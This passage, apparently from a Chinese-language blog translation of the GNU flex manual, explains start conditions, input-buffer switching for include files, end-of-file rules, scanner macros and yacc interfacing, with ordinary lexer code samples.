that&#39;s not a &#39;*&#39; *&#x2F;</span><br><span class="line">&lt;comment&gt;&quot;*&quot;+[^*&#x2F;\n]*   &#x2F;* eat up &#39;*&#39;s not followed by &#39;&#x2F;&#39;s *&#x2F;</span><br><span class="line">&lt;comment&gt;\n             ++line_num;</span><br><span class="line">&lt;comment&gt;&quot;*&quot;+&quot;&#x2F;&quot;        BEGIN(INITIAL);</span><br></pre></td></tr></table></figure><p>请注意，起始条件名称实际上是以整数值存储。因此，上述内容可以通过以下方式扩展：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">%x comment foo</span><br><span class="line">%%</span><br><span class="line">        int line_num &#x3D; 1;</span><br><span class="line">        int comment_caller;</span><br><span class="line"></span><br><span class="line">&quot;&#x2F;*&quot;         &#123;</span><br><span class="line">             comment_caller &#x3D; INITIAL;</span><br><span class="line">             BEGIN(comment);</span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;foo&gt;&quot;&#x2F;*&quot;    &#123;</span><br><span class="line">             comment_caller &#x3D; foo;</span><br><span class="line">             BEGIN(comment);</span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line">&lt;comment&gt;[^*\n]*        &#x2F;* eat anything that&#39;s not a &#39;*&#39; *&#x2F;</span><br><span class="line">&lt;comment&gt;&quot;*&quot;+[^*&#x2F;\n]*   &#x2F;* eat up &#39;*&#39;s not followed by &#39;&#x2F;&#39;s *&#x2F;</span><br><span class="line">&lt;comment&gt;\n             ++line_num;</span><br><span class="line">&lt;comment&gt;&quot;*&quot;+&quot;&#x2F;&quot;        BEGIN(comment_caller);</span><br></pre></td></tr></table></figure><p>此外，您可以使用整数值YY_START宏访问当前的start condition。例如，上面的分配comment_caller可以改为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">comment_caller &#x3D; YY_START；</span><br></pre></td></tr></table></figure><p>Flex提供YYSTATE作为YY_START的别名(因为AT＆T使用了它)。</p><p>最后，这是一个示例，说明如何使用排他的开始条件来匹配C样式的带引号的字符串，包括扩展的转义序列(但不包括检查过长的字符串)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">%x str</span><br><span class="line"></span><br><span class="line">   %%</span><br><span class="line">           char string_buf[MAX_STR_CONST];</span><br><span class="line">           char *string_buf_ptr;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   \&quot;      string_buf_ptr &#x3D; string_buf; BEGIN(str);</span><br><span class="line"></span><br><span class="line">   &lt;str&gt;\&quot;        &#123; &#x2F;* saw closing quote - all done *&#x2F;</span><br><span class="line">           BEGIN(INITIAL);</span><br><span class="line">           *string_buf_ptr &#x3D; &#39;\0&#39;;</span><br><span class="line">           &#x2F;* return string constant token type and</span><br><span class="line">            * value to parser</span><br><span class="line">            *&#x2F;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">   &lt;str&gt;\n        &#123;</span><br><span class="line">           &#x2F;* error - unterminated string constant *&#x2F;</span><br><span class="line">           &#x2F;* generate error message *&#x2F;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">   &lt;str&gt;\\[0-7]&#123;1,3&#125; &#123;</span><br><span class="line">           &#x2F;* octal escape sequence *&#x2F;</span><br><span class="line">           int result;</span><br><span class="line"></span><br><span class="line">           (void) sscanf( yytext + 1, &quot;%o&quot;, &amp;result );</span><br><span class="line"></span><br><span class="line">           if ( result &gt; 0xff )</span><br><span class="line">                   &#x2F;* error, constant is out-of-bounds *&#x2F;</span><br><span class="line"></span><br><span class="line">           *string_buf_ptr++ &#x3D; result;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">   &lt;str&gt;\\[0-9]+ &#123;</span><br><span class="line">           &#x2F;* generate error - bad escape sequence; something</span><br><span class="line">            * like &#39;\48&#39; or &#39;\0777777&#39;</span><br><span class="line">            *&#x2F;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">   &lt;str&gt;\\n  *string_buf_ptr++ &#x3D; &#39;\n&#39;;</span><br><span class="line">   &lt;str&gt;\\t  *string_buf_ptr++ &#x3D; &#39;\t&#39;;</span><br><span class="line">   &lt;str&gt;\\r  *string_buf_ptr++ &#x3D; &#39;\r&#39;;</span><br><span class="line">   &lt;str&gt;\\b  *string_buf_ptr++ &#x3D; &#39;\b&#39;;</span><br><span class="line">   &lt;str&gt;\\f  *string_buf_ptr++ &#x3D; &#39;\f&#39;;</span><br><span class="line"></span><br><span class="line">   &lt;str&gt;\\(.|\n)  *string_buf_ptr++ &#x3D; yytext[1];</span><br><span class="line"></span><br><span class="line">   &lt;str&gt;[^\\\n\&quot;]+        &#123;</span><br><span class="line">           char *yptr &#x3D; yytext;</span><br><span class="line"></span><br><span class="line">           while ( *yptr )</span><br><span class="line">                   *string_buf_ptr++ &#x3D; *yptr++;</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure><p>通常，例如在上面的某些示例中，您最终要编写一堆规则，所有规则都以相同的开始条件开头。通过引入启动条件范围的概念，Flex使此操作变得更加轻松和简洁。起始条件范围始于：<code>&lt;SCs&gt; {</code><br>其中<code>&lt;SCs&gt;</code>是一个或多个开始条件的列表。在开始条件范围内，每个规则都会自动为其应用前缀<code>&lt;SCs&gt;</code>，直到遇到匹配的“}“。因此，例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;ESC&gt;&#123;</span><br><span class="line">    &quot;\\n&quot;   return &#39;\n&#39;;</span><br><span class="line">    &quot;\\r&quot;   return &#39;\r&#39;;</span><br><span class="line">    &quot;\\f&quot;   return &#39;\f&#39;;</span><br><span class="line">    &quot;\\0&quot;   return &#39;\0&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>等价于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;ESC&gt;&quot;\\n&quot;  return &#39;\n&#39;;</span><br><span class="line">&lt;ESC&gt;&quot;\\r&quot;  return &#39;\r&#39;;</span><br><span class="line">&lt;ESC&gt;&quot;\\f&quot;  return &#39;\f&#39;;</span><br><span class="line">&lt;ESC&gt;&quot;\\0&quot;  return &#39;\0&#39;;</span><br></pre></td></tr></table></figure><p>起始条件范围可以嵌套。<br>以下routines可用于操纵开始条件的堆栈：</p><ul><li><p><code>void yy_push_state (int new_state)</code><br>  将当前启动条件推送到启动条件堆栈的顶部，并切换到 new_state, 就好像您曾经使用过的一样 BEGIN new_state (请注意，启动条件名称也是整数)。</p></li><li><p><code>void yy_pop_state ()</code><br>  弹出堆栈的顶部，然后切换到堆栈的顶部BEGIN。</p></li><li><p><code>int yy_top_state ()</code><br>  返回堆栈的顶部而不更改堆栈的内容。</p></li></ul><p>起始条件堆栈会动态增长，因此没有内置的大小限制。如果内存耗尽，程序将中止执行。<br>要使用开始条件堆栈，scanner必须包含一个%option stack指令(请参阅scanner选项)。</p><h2 id="11-Multiple-Input-Buffers"><a href="#11-Multiple-Input-Buffers" class="headerlink" title="11 Multiple Input Buffers"></a>11 Multiple Input Buffers</h2><p>一些scanner(例如支持“ include”文件的scanner)需要从多个输入流中读取。由于Flex扫描程序会进行大量缓冲，因此无法通过简单地重写对扫描上下文敏感的<code>YY_INPUT()</code>来控制将从下一个输入读取的位置。<br><code>YY_INPUT()</code>仅在扫描程序到达其缓冲区的末尾时才调用，这可能是在扫描诸如include语句之类的语句(会花费)很长的时间，(在这之后)，该语句要求切换输入源。</p><p>为了解决这类问题，flex提供了一种创建多个输入缓冲区之间和切换的机制。输入缓冲区是通过使用以下命令创建的：</p><ul><li><code>YY_BUFFER_STATE  yy_create_buffer( FILE *file, int size )</code></li></ul><p>参数是FILE指针和size，并创建与给定文件关联的缓冲区，缓冲区足够大以容纳size大小的字符(发生问题时，试试使用<code>YY_BUF_SIZE</code>作为大小)。它返回一个<code>YY_BUFFER_STATE</code>句柄，可以用来将其传递给其他例程(请参见下文)。<br><code>YY_BUFFER_STATE</code>类型是指向opaque structure <code>yy_buffer_state</code>结构的指针，因此您可以根据需要将<code>YY_BUFFER_STATE</code>变量安全地初始化为<code>((YY_BUFFER_STATE)0)</code>，还可以引用opaque structure以正确声明源文件中的输入缓冲区(而非源文件中的scanner)。请注意，调用<code>yy_create_buffer</code>时的FILE指针仅用作<code>YY_INPUT</code>看到的<code>yyin</code>值。如果重新定义<code>YY_INPUT()</code>使其不再使用<code>yyin</code>，则可以安全地将NULL<br>FILE指针传递给<code>yy_create_buffer</code>。</p><p>您可以使用以下方法选择要扫描的特定缓冲区：</p><ul><li><code>void yy_switch_to_buffer ( YY_BUFFER_STATE new_buffer )</code></li></ul><p>这个函数可切换扫描器的输入缓冲区，使得后续tokens将来自new_buffer。请注意，<code>yywrap()</code>可以使用<code>yy_switch_to_buffer()</code>来设置要继续扫描的内容，而不是打开新文件并用<code>yyin</code>指向它。如果您正在寻找输入缓冲区的堆栈，那么您想使用<code>yypush_buffer_state()</code>代替此函数。还要注意，通过<code>yy_switch_to_buffer()</code>或<code>yywrap()</code>切换输入源不会更改启动条件。</p><ul><li><code>void yy_delete_buffer ( YY_BUFFER_STATE buffer )</code></li></ul><p>用于回收与缓冲区关联的存储。 (缓冲区可以为NULL，在这种情况下例程不执行任何操作。)</p><p>您还可以使用以下方法清除缓冲区的当前内容：</p><ul><li><code>void yypush_buffer_state( YY_BUFFER_STATE buffer )</code></li></ul><p>该函数将新的缓冲区状态压入内部栈。压入的状态变为新的当前状态。栈由flex维护，并将根据需要增长。当您要更改状态时，应使用此函数代替<code>yy_switch_to_buffer</code>，但保留当前状态以供以后使用。</p><ul><li><code>void yypop_buffer_state ( )</code></li></ul><p>此函数从栈顶部弹出当前状态，并通过调用<code>yy_delete_buffer</code>删除它。堆栈中的下一个状态(如果有)将成为新的当前状态。</p><p><code>void yy_flush_buffer ( YY_BUFFER_STATE buffer )</code></p><p>此函数会丢弃缓冲区的内容，因此，下次扫描程序尝试从缓冲区中匹配token时，它将首先使用<code>YY_INPUT()</code>重新填充缓冲区。</p><p><code>YY_BUFFER_STATE yy_new_buffer ( FILE *file, int size )</code></p><p>是<code>yy_create_buffer()</code>的别名，用于兼容 C ++的new和delete用于创建和销毁动态对象。<br><code>YY_CURRENT_BUFFER</code>宏将<code>YY_BUFFER_STATE</code>句柄返回到当前缓冲区。不应将其用作左值。</p><p>这是使用这些功能编写扩展包含文件的scanner的两个示例(下面将讨论&lt;&lt; EOF &gt;&gt;功能)。</p><p>第一个示例使用<code>yypush_buffer_state</code>和<code>yypop_buffer_state</code>。 Flex在维护一个内部栈。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* the &quot;incl&quot; state is used for picking up the name</span><br><span class="line">    * of an include file</span><br><span class="line">    *&#x2F;</span><br><span class="line">   %x incl</span><br><span class="line">   %%</span><br><span class="line">   include             BEGIN(incl);</span><br><span class="line"></span><br><span class="line">   [a-z]+              ECHO;</span><br><span class="line">   [^a-z\n]*\n?        ECHO;</span><br><span class="line"></span><br><span class="line">   &lt;incl&gt;[ \t]*      &#x2F;* eat the whitespace *&#x2F;</span><br><span class="line">   &lt;incl&gt;[^ \t\n]+   &#123; &#x2F;* got the include file name *&#x2F;</span><br><span class="line">           yyin &#x3D; fopen( yytext, &quot;r&quot; );</span><br><span class="line"></span><br><span class="line">           if ( ! yyin )</span><br><span class="line">               error( ... );</span><br><span class="line"></span><br><span class="line">yypush_buffer_state(yy_create_buffer( yyin, YY_BUF_SIZE ));</span><br><span class="line"></span><br><span class="line">           BEGIN(INITIAL);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">   &lt;&lt;EOF&gt;&gt; &#123;</span><br><span class="line">yypop_buffer_state();</span><br><span class="line"></span><br><span class="line">           if ( !YY_CURRENT_BUFFER )</span><br><span class="line">               &#123;</span><br><span class="line">               yyterminate();</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure><p>下面的第二个示例执行与上一个示例相同的操作，但是手动管理其自己的输入缓冲区栈(而不是让flex进行操作)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* the &quot;incl&quot; state is used for picking up the name</span><br><span class="line">     * of an include file</span><br><span class="line">     *&#x2F;</span><br><span class="line">    %x incl</span><br><span class="line"></span><br><span class="line">    %&#123;</span><br><span class="line">    #define MAX_INCLUDE_DEPTH 10</span><br><span class="line">    YY_BUFFER_STATE include_stack[MAX_INCLUDE_DEPTH];</span><br><span class="line">    int include_stack_ptr &#x3D; 0;</span><br><span class="line">    %&#125;</span><br><span class="line"></span><br><span class="line">    %%</span><br><span class="line">    include             BEGIN(incl);</span><br><span class="line"></span><br><span class="line">    [a-z]+              ECHO;</span><br><span class="line">    [^a-z\n]*\n?        ECHO;</span><br><span class="line"></span><br><span class="line">    &lt;incl&gt;[ \t]*      &#x2F;* eat the whitespace *&#x2F;</span><br><span class="line">    &lt;incl&gt;[^ \t\n]+   &#123; &#x2F;* got the include file name *&#x2F;</span><br><span class="line">            if ( include_stack_ptr &gt;&#x3D; MAX_INCLUDE_DEPTH )</span><br><span class="line">                &#123;</span><br><span class="line">                fprintf( stderr, &quot;Includes nested too deeply&quot; );</span><br><span class="line">                exit( 1 );</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            include_stack[include_stack_ptr++] &#x3D;</span><br><span class="line">                YY_CURRENT_BUFFER;</span><br><span class="line"></span><br><span class="line">            yyin &#x3D; fopen( yytext, &quot;r&quot; );</span><br><span class="line"></span><br><span class="line">            if ( ! yyin )</span><br><span class="line">                error( ... );</span><br><span class="line"></span><br><span class="line">            yy_switch_to_buffer(</span><br><span class="line">                yy_create_buffer( yyin, YY_BUF_SIZE ) );</span><br><span class="line"></span><br><span class="line">            BEGIN(INITIAL);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    &lt;&lt;EOF&gt;&gt; &#123;</span><br><span class="line">            if ( --include_stack_ptr  0 )</span><br><span class="line">                &#123;</span><br><span class="line">                yyterminate();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            else</span><br><span class="line">                &#123;</span><br><span class="line">                yy_delete_buffer( YY_CURRENT_BUFFER );</span><br><span class="line">                yy_switch_to_buffer(</span><br><span class="line">                     include_stack[include_stack_ptr] );</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>以下例程可用于设置输入缓冲区以扫描内存中的字符串而不是文件。它们都创建了一个新的输入缓冲区来扫描字符串，并返回一个对应的<code>YY_BUFFER_STATE</code>句柄(完成后应使用<code>yy_delete_buffer()</code>删除)。还使用<code>yy_switch_to_buffer()</code>切换到新缓冲区，因此对<code>yylex()</code>的下一次调用将开始扫描这个字符串。</p><ul><li><code>YY_BUFFER_STATE yy_scan_string ( const char *str )</code></li></ul><p>扫描NULL结尾的字符串</p><ul><li><code>YY_BUFFER_STATE yy_scan_bytes ( const char *bytes, int len )</code></li></ul><p>扫描len长度(包括NULL)的字符串</p><p>请注意，这两个函数都会创建并扫描字符串或字节的副本。 (这可能是可取的，因为<code>yylex()</code>修改了它正在扫描的缓冲区的内容。)您可以使用以下方法避免复制：</p><ul><li><code>YY_BUFFER_STATE yy_scan_buffer (char *base, yy_size_t size)</code></li></ul><p>它将扫描从基址开始的缓冲区，该缓冲区由size大小字节组成，其最后两个字节必须为<code>YY_END_OF_BUFFER_CHAR(ASCII NUL)</code>。最后两个字节不扫描。因此，扫描由base [0]到base [size-2]组成。</p><p>如果您无法以这种方式设置base(即忘记最后两个<code>YY_END_OF_BUFFER_CHAR</code>字节)，则<code>yy_scan_buffer()</code>将返回NULL指针，而不是创建新的输入缓冲区。</p><p>Data type: <code>yy_size_t</code></p><p>是整数类型，您可以将其转换为反映缓冲区大小的整数表达式。</p><h2 id="12-End-of-File-Rules"><a href="#12-End-of-File-Rules" class="headerlink" title="12 End-of-File Rules"></a>12 End-of-File Rules</h2><p>特殊规则<code>&lt;&lt;EOF&gt;&gt;</code>指示遇到文件结尾符(end-of-file)和<code>yywrap()</code>返回非零值时，要采取的action(即，表示没有其他要处理的文件)。该action必须通过执行以下任一action来完成：</p><ul><li>分配 yyin 到新的输入文件(在的<code>flex</code>早期版本中 ，完成分配后，您必须调用特殊action<code>YY_NEW_FILE</code>。现在，这不再是必需的。)</li><li>执行一条<code>return</code>语句；</li><li>执行<code>yyterminate()</code>特殊action。</li><li>或者，如上例所示，用<code>yy_switch_to_buffer()</code>切换到新的缓冲区。</li></ul><p><code>&lt;&lt;EOF&gt;&gt;</code>规则不得与其他pattern一起使用，他们可能只能用start condition进行限定。如果给出了未限定的<code>&lt;&lt;EOF&gt;&gt;</code>规则，则该规则适用于它适用于尚未执行<code>&lt;&lt;EOF&gt;&gt;</code>action的所有启动条件。。要只为初始开始条件指名<code>&lt;&lt;EOF&gt;&gt;</code>规则，请使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;INITIAL&gt;&lt;&lt;EOF&gt;&gt;</span><br></pre></td></tr></table></figure><p>这些规则对于捕获未封闭的注释(comments)等有用。例子如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> %x quote</span><br><span class="line"> %%</span><br><span class="line"></span><br><span class="line"> ...other rules for dealing with quotes...</span><br><span class="line"></span><br><span class="line"> &lt;quote&gt;&lt;&lt;EOF&gt;&gt;   &#123;</span><br><span class="line">          error( &quot;unterminated quote&quot; );</span><br><span class="line">          yyterminate();</span><br><span class="line">          &#125;</span><br><span class="line">&lt;&lt;EOF&gt;&gt;  &#123;</span><br><span class="line">          if ( *++filelist )</span><br><span class="line">              yyin &#x3D; fopen( *filelist, &quot;r&quot; );</span><br><span class="line">          else</span><br><span class="line">             yyterminate();</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure><h2 id="13-Miscellaneous-Macros"><a href="#13-Miscellaneous-Macros" class="headerlink" title="13 Miscellaneous Macros"></a>13 Miscellaneous Macros</h2><p><code>YY_USER_ACTION</code> 可以定义宏以提供始终在匹配规则的操作之前执行的操作。例如，可以使用<code>#define’d</code>去调用一个routine以将yytext转换为小写，当<code>YY_USER_ACTION</code> 被调用，(规则编号从1开始)匹配的规则编号会保存在变量<code>yy_act</code>中。如果你想知道每一个规则的匹配频率，请看下面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define YY_USER_ACTION ++ctr[yy_act]</span><br></pre></td></tr></table></figure><p><code>ctr</code> 是一个数组，用于保存不同规则的计数结果。请注意，<code>YY_NUM_RULES</code> 宏命令给出了规则总数(包括默认规则)，即使你使用 ‘-s)’，所以，正确的<code>ctr</code>声明是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int ctr[YY_NUM_RULES];</span><br></pre></td></tr></table></figure><p><code>YY_USER_INIT</code>可以定义宏以提供始终在第一次扫描之前(以及在完成扫描器的内部初始化之前)执行的操作。例如，它可以被用来调用一个例程(routine )来读入数据或者打开一个日志文件。</p><p>宏<code>yy_set_interactive(is_interactive)</code>可以被用来控制当前缓冲区是否被认为是交互式的。一个交互式的缓冲区处理速度较慢，但是当扫描器的输入源是交互式时，必须使用交互式缓冲区，以避免由于等待填充缓冲区而引出的问题(请参阅 <a href="http://westes.github.io/flex/manual/Scanner-Options.html#Scanner-Options" target="_blank" rel="noopener">Scanner Options</a> 一文中关于‘-I’ flag的讨论)。<br>宏调用中的非零值会将缓冲区标记为交互式，零值记为非交互式的。请注意，这个宏的使用将覆盖<code>%option always-interactive</code>和 <code>%option never-interactive</code> (参阅 <a href="http://westes.github.io/flex/manual/Scanner-Options.html#Scanner-Options" target="_blank" rel="noopener">Scanner Options</a>)。`yy_set_interactive必须在开始扫描交互式(或者非交互式)缓冲区之前调用。</p><p>The macro yy_set_bol(at_bol) can be used to control whether the current buffer’s scanning context for the next token match is done as though at the beginning of a line. A non-zero macro argument makes rules anchored with ‘^’ active, while a zero argument makes ‘^’ rules inactive.</p><p>如果从当前缓冲区扫描的下一个token将启用“^”规则，则宏YY_AT_BOL()返回true，否则返回false。</p><p>在生成的扫描程序中，所有actions都收集在一个大的switch语句中，并使用<code>YY_BREAK</code>分开，<code>YY_BREAK</code>可以被重新定义。<br>默认情况下，它只是一个<code>break</code>，用于将每个规则的action与后面规则的action分开。<br>允许对<code>YY_BREAK</code> 重新定义，例如，C++用户可以通过#define YY_BREAK 来让YY_BREAK不执行任何操作(要非常小心，每个规则都需要以一个<code>break</code>或一个<code>return</code>结尾！)，以避免遇到提示编译warnning(unreachable statement)，因为规则的action以<code>return</code>的话，则<code>YY_BREAK</code>无法访问到。</p><h2 id="14-Values-Available-To-the-User"><a href="#14-Values-Available-To-the-User" class="headerlink" title="14 Values Available To the User"></a>14 Values Available To the User</h2><p>本节总结了在rule actions下，可供用户使用的一些值:</p><ul><li><p><code>char *yytext</code></p><p>维护当前token的文本信息，它可以被修改，但是不能加长，即不能在末尾添加字符。</p><p>如果特殊的directive %array出现在scanner description的first section，那么<code>yytext</code>将被声明为<code>char yytext[YYLMAX]</code>.</p><p><code>YYLMAX</code>是一个宏定义，默认值为<code>8KB</code>，你可以在first section重定义它的大小。 使用<code>％array</code>会导致scanner的速度稍慢一些，但是<code>yytext</code>的值不受<code>unput()</code>调用的影响。当<code>yytext</code>是字符指针时，<code>unput()</code>可能会破坏其值。与％array相对的是％pointer，%pointer是默认设置。<br>生成c++ scanner(开启“-+”flag)时，不能使用％array。</p></li><li><p><code>int yyleng</code></p><p>保存当前token的长度</p></li><li><p><code>FILE *yyin</code></p><p>是默认情况下flex读取的文件。它可以重新定义，但只有在开始扫描之前或遇到<code>EOF</code>之后才有意义。在扫描过程中更改它会产生意外结果，因为flex会缓存其输入。当由于遇到<code>EOF</code>而终止扫描后，可以重新分配<code>yyin</code>指向新的输入文件，然后再次调用scanner以继续扫描。</p></li><li><p><code>void yyrestart( FILE *new_file )</code></p><p>可以将<code>yyin</code>指向新的输入文件。立即切换到新文件(任何先前缓存的输入都将丢失)。请注意，使用<code>yyin</code>作为参数调用<code>yyrestart()</code>会丢弃当前的输入缓冲区(input buffer)，并继续扫描相同的输入文件。</p></li><li><p><code>FILE *yyout</code></p><p>是执行ECHO操作的文件。可以由用户重新定义。</p></li><li><p><code>YY_CURRENT_BUFFER</code></p><p>返回 <code>YY_BUFFER_STATE</code> 句柄到当前的缓冲区</p></li><li><p><code>YY_START</code><br>返回与当前开始条件相对应的整数值。随后，您可以将这个值与BEGIN一起使用以返回到该开始条件。</p></li></ul><h2 id="15-Interfacing-with-Yacc"><a href="#15-Interfacing-with-Yacc" class="headerlink" title="15 Interfacing with Yacc"></a>15 Interfacing with Yacc</h2><p>flex的主要用途之一是与yacc解析器生成器一起使用。 yacc解析器应当调用<code>yylex()</code>来查找下一个输入token。yylex应返回下一个token的类型，并将所有关联的值放入全局变量<code>yylval</code>中。<br>要将flex与yacc一起使用，请为yacc指定“-d”选项，来生成文件y.tab.h，其中包含所有出现在yacc输入中的<code>％token</code>的定义。<br>然后，将此文件包含在Flex scanner中。例如，如果token之一是<code>TOK_NUMBER</code>，则scanner的一部分可能看起来像：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">#include &quot;y.tab.h&quot;</span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line">[0-9]+        yylval &#x3D; atoi( yytext ); return TOK_NUMBER;</span><br></pre></td></tr></table></figure><h2 id="16-Scanner-Options"><a href="#16-Scanner-Options" class="headerlink" title="16 Scanner Options"></a>16 Scanner Options</h2><p>//todo</p><h2 id="17-Performance-Considerations"><a href="#17-Performance-Considerations" class="headerlink" title="17 Performance Considerations"></a>17 Performance Considerations</h2><p>//todo</p><h2 id="18-Generating-C-Scanners"><a href="#18-Generating-C-Scanners" class="headerlink" title="18 Generating C++ Scanners"></a>18 Generating C++ Scanners</h2><p>重要:当前的扫描类的形式是实验性的，并且在各主要版本中有较大的不同。</p><p>flex提供两种不同的方式来生成用于C++的scanner。第一种方式就是简单的编译一个由flex生成的scanner，scanner由C++编译而不是C编译。你应该不会遇到任何编译错误(有就查看错误报告)。你可以在rule actions中使用C++代码而不是C代码。注意scanner的默认输入源仍然是 yyin, 默认回显仍然是 yyout。这两者都是 FILE* 变量，而不是C++流。</p><p>你也可以使用flex去生成一个C++ scanner类，使用’-+’选项(或者，相等的，%option c++)，如果flex可执行文件的名称以”+”结尾，则会自动指定，比如 flex++。<br>当使用此选项时，flex默认将扫描程序生成为文件lex.yy.cc 而不是 lex.yy.c。生成的扫描程序包括头文件 FlexLexer.h，该文件定义了两个C++类的接口。</p><p>在FlexLexer.h中的第一个类是FlexLexer，它提供定义基本扫描程序类接口的抽象基类。它提供以下成员函数：</p><ul><li><code>const char* YYText()</code></li></ul><p>返回最近匹配的token的文本，与yytext等效。</p><ul><li><code>int YYLeng()</code></li></ul><p>返回最近匹配的token的长度，与yyleng等效。</p><ul><li><code>int lineno() const</code></li></ul><p>返回当前输入行号(参考 %option yylineno)，如果未使用 ％option yylineno，则返回1。</p><ul><li><code>void set_debug( int flag 